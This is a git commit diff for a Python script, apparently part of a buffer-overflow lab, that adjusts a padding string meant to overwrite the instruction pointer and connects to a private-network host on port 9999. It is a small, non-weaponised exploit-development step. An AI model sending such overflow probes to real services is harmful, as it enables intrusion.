839f8c90da7a982dabd6fc0282132d16e0f45e30
Aditya Joshi <117490641+Adio20102@users.noreply.github.com>
2024-01-13 03:02:46 +0530

    4.overwrEIP.py

--- 4.overwrEIP.py
+++ 4.overwrEIP.py
@@ -4,7 +4,7 @@ import sys
 import socket
 from time import sleep
 
-shellcode = "A"* 2003 + "B"* 4
+shellcode = "A"* 2002 + "B"* 4
 try:
       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('192.168.40.135',9999))
